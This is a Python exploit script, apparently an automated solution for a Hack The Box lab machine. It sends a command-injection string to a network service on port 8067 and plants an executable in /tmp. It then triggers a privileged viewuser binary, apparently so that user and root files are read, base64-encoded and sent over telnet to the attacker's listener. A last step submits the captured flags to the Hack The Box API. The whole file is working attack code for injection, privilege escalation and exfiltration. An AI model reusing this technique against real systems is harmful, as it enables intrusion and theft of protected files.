#!/usr/bin/env python3

import socket
import requests
import subprocess
import _thread
import base64

#Global Vars
rhost = '10.10.10.117'
rport = 8067
lhost = '0.0.0.0'
lport = 443 
api_token= ''
machine_id = 163

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((rhost,rport))
    client.recv(1024)
    client.sendall(b"AB; echo 'cat /home/djmardov/Documents/user.txt /root/root.txt | base64 | telnet 10.10.x.x 443; ' > /tmp/listusers; chmod 777 /tmp/listusers; /usr/bin/viewuser; rm /tmp/listusers\n")
    client.shutdown(socket.SHUT_RD)
    client.close()
    print("Command send to target")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((lhost,lport))
    server.listen()
    print("waitng for incoming connection...") 
    conn, addr = server.accept()
    data = recvall(conn)    
    encoded = data.replace(b'\r\n',b'') 
    decoded = base64.b64decode(encoded)
    decoded = decoded.decode("utf-8")
    user, root, tmp = decoded.split('\n')
    register_flags(user,root)

def recvall(connection):
    buffer = bytearray()
    while True:
        try:
            data = connection.recv(1 << 12)
        except socket.timeout:
            pass
        else:
            if data:
                buffer.extend(data)
            else:
                return bytes(buffer)

def register_flags(user,root):
    print("Send User Flag: " + user)
    send_flag(user,'user','10')
    print(root)
    send_flag(root,'root','10')

   

    
def send_flag(hash_value,flag_type, diff):

    proxies = {
        'http': 'http://127.0.0.1:8080',
    }
    
    headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest'
            }
    r = requests.post('https://www.hackthebox.eu/api/machines/own/' + flag_type+ '/' + str(machine_id) + '/?api_token=' + api_token, data = {'hash':hash_value, 'diff' : diff}, headers=headers,proxies=proxies)
    print(r.text)

if __name__ == '__main__':
    main()


